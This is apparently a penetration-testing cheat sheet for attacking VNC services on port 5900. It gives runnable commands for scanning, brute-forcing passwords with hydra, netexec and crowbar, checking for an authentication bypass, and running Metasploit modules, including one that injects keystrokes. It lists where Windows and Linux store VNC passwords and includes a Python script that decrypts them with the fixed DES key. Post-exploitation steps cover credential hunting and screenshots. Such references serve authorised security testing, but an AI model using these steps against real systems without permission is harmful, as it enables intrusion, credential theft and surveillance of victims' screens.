# Port 5900 - VNC

## Table of Contents
- [Enumeration](#enumeration)
  - [Nmap Scripts](#nmap-scripts)
  - [Service Detection](#service-detection)
- [Connection](#connection)
- [Brute Force](#brute-force)
- [Exploitation](#exploitation)
  - [Authentication Bypass](#authentication-bypass)
  - [VNC Password Cracking](#vnc-password-cracking)

---

## Enumeration

### Nmap Scripts

```shell
# Service detection
nmap -p 5900-5910 -sV $rhost

# VNC enumeration
nmap -p 5900 --script vnc-info $rhost
nmap -p 5900 --script vnc-brute $rhost
nmap -p 5900 --script realvnc-auth-bypass $rhost
```

### Service Detection

```shell
# Check if VNC is running
nmap -p 5900 -sV $rhost

# Banner grabbing
nc -nv $rhost 5900
```

---

## Connection

### VNC Viewers

```shell
# vncviewer
vncviewer $rhost:5900

# With password
vncviewer $rhost:5900 -passwd password_file

# TigerVNC
vncviewer $rhost::5900

# Remmina
remmina
# Add new VNC connection
```

### Authentication

```shell
# VNC uses display numbers (0 = port 5900, 1 = port 5901, etc.)
vncviewer $rhost:0   # Port 5900
vncviewer $rhost:1   # Port 5901
```

---

## Brute Force

### Hydra

```shell
# VNC brute force
hydra -P /usr/share/wordlists/rockyou.txt vnc://$rhost

# With wordlist
hydra -P passwords.txt -f $rhost vnc
```

### Nmap

```shell
nmap -p 5900 --script vnc-brute $rhost
```

### NetExec

```shell
netexec vnc $rhost -p passwords.txt
```

### Crowbar

```shell
crowbar -b vnckey -s $rhost/32 -p passwords.txt
```

---

## Exploitation

### Authentication Bypass

```shell
# Check for RealVNC auth bypass
nmap -p 5900 --script realvnc-auth-bypass $rhost

# Metasploit
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS $rhost
run
```

### VNC Password Cracking

VNC passwords are stored encrypted but easily crackable.

#### Windows Locations

```shell
# RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\Password
HKEY_CURRENT_USER\Software\RealVNC\WinVNC4\Password

# TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server\Password

# TigerVNC
HKEY_LOCAL_MACHINE\Software\TigerVNC\WinVNC4\Password

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
```

#### Linux Locations

```shell
~/.vnc/passwd
/etc/vnc/passwd
```

#### Decrypting VNC Password

```shell
# Using vncpwd
vncpwd encrypted_password_file

# Metasploit
use post/multi/gather/vnc_password
set SESSION 1
run

# Online tools
# https://github.com/trinitronx/vncpasswd.py
python vncpasswd.py -d -H <hex_password>
```

#### VNC Password Decryption (Manual)

```python
#!/usr/bin/env python3
# VNC uses DES with a fixed key
from Crypto.Cipher import DES

key = bytes([0x17, 0x52, 0x6b, 0x06, 0x23, 0x4e, 0x58, 0x07])
encrypted = bytes.fromhex("YOUR_HEX_HERE")
des = DES.new(key, DES.MODE_ECB)
print(des.decrypt(encrypted))
```

---

## Post-Exploitation

### Credential Dumping

```shell
# If you have GUI access, look for:
# - Saved passwords in browsers
# - Password managers
# - Text files with credentials
# - SSH keys
```

### Screenshot

```shell
# Using xwd
xwd -root -display :0 > screenshot.xwd

# Convert to PNG
convert screenshot.xwd screenshot.png
```

---

## Common VNC Ports

| Port | Description |
|------|-------------|
| 5900 | VNC display :0 |
| 5901 | VNC display :1 |
| 5902 | VNC display :2 |
| 5800 | VNC over HTTP (display :0) |
| 5801 | VNC over HTTP (display :1) |

---

## Metasploit Modules

```shell
# No auth check
use auxiliary/scanner/vnc/vnc_none_auth

# Login check
use auxiliary/scanner/vnc/vnc_login

# Inject keystrokes
use exploit/multi/vnc/vnc_keyboard_exec
```
